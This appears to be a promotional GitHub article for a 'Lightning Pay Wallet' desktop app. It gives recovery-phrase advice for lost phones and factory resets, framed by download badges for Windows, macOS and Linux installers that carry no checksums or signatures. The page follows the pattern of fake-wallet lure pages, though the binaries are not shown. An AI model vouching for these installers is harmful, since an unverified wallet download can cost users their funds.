<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# You lost your phone: what survives and what does not
The desktop wallet is not the phone, but the question is the same one: was there a phrase?
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

The most-asked recovery question is about a lost phone, and the answer turns on one thing that has
nothing to do with the device: whether a recovery phrase existed before it disappeared.

## Why the phone story is different here

Lightning Pay Wallet's current release is the desktop application for Windows, macOS and Linux. A
phone build is not part of it. So the phone questions people search for are usually about a different
mobile wallet, and the logic carries over unchanged: the device held keys, the keys came from a
phrase, and the phrase is what makes the loss survivable.

## With a phrase

Nothing is lost. Install the wallet on another machine, choose restore, enter the phrase, and let it
sync. On-chain funds return at the same addresses; channel balances return if the channel backup came
with them.

The phone itself should be treated as compromised rather than merely lost: whoever finds it may get
past a screen lock. Moving the funds to a fresh wallet with a new phrase is the cautious path, and it
costs one transaction.

## Without a phrase

Then the funds on that device are gone, and no support channel changes that. A non-custodial wallet has
no server copy and no reset. Recovery-tool offers that promise otherwise are the second loss, after the
first.

This is the case where prevention was the only cure, which is why
[backing up a Lightning wallet](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/back-up-a-lightning-wallet.md)
argues for a written phrase and a tested restore.

## Factory resets and new devices

A factory reset is the same event as a theft from the wallet's point of view: the local state is gone.
The phrase restores the keys, and the channel backup restores the channel state. If neither was saved,
the reset is final.

## Reporting a lost device

Change anything the device had access to, which for a wallet is nothing but the wallet itself, and
move funds if the phrase is at risk of being found with the device. A phrase stored in a photo on the
same phone is a phrase that was lost with it.

## Questions people ask

### Can I track my phone's wallet?

No. There is no account, no server-side balance and nothing to log into.

### I lost the phone but have the phrase. What now?

Restore on another machine, confirm the balance, then move the funds to a new wallet and treat the old
phrase as compromised.

### Does a factory reset delete the funds?

It deletes the local wallet. The funds live on the network and return with the phrase and, for
channels, the backup.

## Related guides

- [Backing up a Lightning wallet: the seed phrase and the SCB file](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/back-up-a-lightning-wallet.md)
- [Recovering a bitcoin wallet with a seed phrase](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/recover-a-bitcoin-wallet-with-a-seed-phrase.md)

